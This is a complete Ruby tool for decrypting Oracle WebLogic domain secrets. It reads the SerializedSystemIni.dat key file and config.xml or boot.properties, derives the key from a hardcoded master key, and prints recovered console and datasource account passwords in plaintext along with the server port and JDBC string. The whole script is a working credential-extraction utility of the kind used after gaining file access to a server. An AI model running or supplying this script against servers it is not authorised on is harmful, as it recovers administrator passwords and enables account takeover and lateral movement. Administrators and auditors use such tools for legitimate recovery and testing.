#!/usr/bin/env ruby
#
# Author L
# Weblogic console login account
#

require 'openssl'
require 'bindata'

WEBLOGIC_MASTER_KEY = '0xccb97558940b82637c8bec3c770f86fa3a391a56'
#RE = %r'([^>]+?)<\/[^>]+?>\s+?<[^>]+?>\{(AES|3DES)\}(.+?)<\/'
RE = %r'([^>\s]+?)(?:<\/[^>]+?>\s+)+?<[^>]+?>\{(AES|AES256|3DES)\}(.+?)<\/'
CipherRE = %r'()\{(AES|AES256|3DES)\}(.+?)$'


class SerializedSystemIni < BinData::Record
  class Key1 < BinData::Record
    uint8 :key_len
    string :ini_key, :read_length => :key_len
  end

  class Key2 < BinData::Record
    uint8 :skip_len
    skip :length => :skip_len
    uint8 :key_len
    string :ini_key, :read_length => :key_len
  end

  endian :little
  uint8 :salt_len
  string :salt, :read_length => :salt_len 
  uint8 :version

  choice :encryption, :selection => ->{ version >= 2 } do
    key1 false
    key2 true
  end
end


def decrypt(algo, key, iv, data)
  de = OpenSSL::Cipher.new(algo)
  de.decrypt
  de.key = key
  de.iv = iv
  de.update(data) + (de.final rescue '')
end


def pbkdf3(p, s, count, dklen, ivlen, hash)
  def makelen(bytes, tolen)
    q, r = bytes.empty? ? [0, 0] : tolen.divmod(bytes.size) 
    bytes * q + bytes[0, r]
  end

  u = hash.digest_length
  v = hash.block_length

  s = makelen(s, v * (s.size.to_f / v).ceil)
  p = makelen(p, v * (p.size.to_f / v).ceil)

  ii = s + p

  kdf = lambda do |xlen, id, i|
    k = (xlen.to_f / u).ceil
    d = id.chr * v
    ai = d + i
    count.times { ai = hash.digest(ai) }
    [ai[0, xlen], i]
  end

  key, i = kdf[dklen, 1, ii]
  init, i = kdf[ivlen, 2, i]
  [key, init]
end


def decrypt_pbe_with_and_128rc2_CBC(cipher_text, password, salt, count)
  kdf = pbkdf3(password, salt, count, 16, 8, OpenSSL::Digest::SHA1.new)
  decrypt('rc2-cbc', kdf[0], kdf[1], cipher_text)
end

def read_ini_file(filename)
  io = open(filename, 'rb')
  begin
    r = SerializedSystemIni.read(io)
  rescue
    abort 'SerializedSystemIni.dat Error' 
  end
  io.close
  [r.salt, r.encryption.ini_key]
end


def weblogic_decrypt(ini_file, accounts)
  # encode this key the "Java" encoding utf-16-be
  password = (WEBLOGIC_MASTER_KEY + "\0").encode('utf-16be').b
  salt, encryption_key = read_ini_file(ini_file)

  # generate the secret-key using:
  #  - PBEWITHSHAAND128BITRC2-CBC
  #  - 5 rounds
  secret_key = decrypt_pbe_with_and_128rc2_CBC(encryption_key, password, salt, 5)

  accounts.each do |username, algo, ciphertext|
    data = ciphertext.unpack1 'm0'
    passwd =
      case algo
      when 'AES'
        decrypt('aes-128-cbc', secret_key, data[0,16], data[16..-1])
      when 'AES256'
        decrypt('aes-256-cbc', secret_key, data[0,16], data[16..-1])
      when '3DES'
        decrypt('des3', secret_key, salt[0,4] * 2, data)
      end
    if username.empty?
      puts "[+] Plaintext: #{passwd}"
    else
      puts "[+] Account: #{username}\t#{passwd}"
    end
  end
end


if __FILE__ == $PROGRAM_NAME
  if ARGV.size == 2
    ini_file, opt = ARGV

    if File.file?(opt)
      config = File.read opt

      server_port = config.match(/<listen-port>(\d+)<\/listen-port>/)
      puts "[*] Server Port: #{server_port[1]}" if server_port

      jdbc = config.each_line.grep /jdbc:/
      puts "[*] JDBC: #{jdbc[0].gsub(/<.*?>/, '')}" if jdbc.size > 0

      accounts = config.scan(RE)
    else
      accounts = opt.scan(CipherRE)
    end

    weblogic_decrypt(ini_file, accounts)
  else
    puts <<~EOF
    usage: weblogic_password.rb <SerializedSystemIni.bat> <config.xml|ciphertext>

    SerializedSystemIni.bat:
      wls<VERSION>/user_projects/domains/<DOMAIN_NAME>/security/SerializedSystemIni.dat

    config.xml:
      wls<VERSION>/user_projects/domains/<DOMAIN_NAME>/config/config.xml

    ciphertext:
      security/boot.properties
    EOF
  end
end
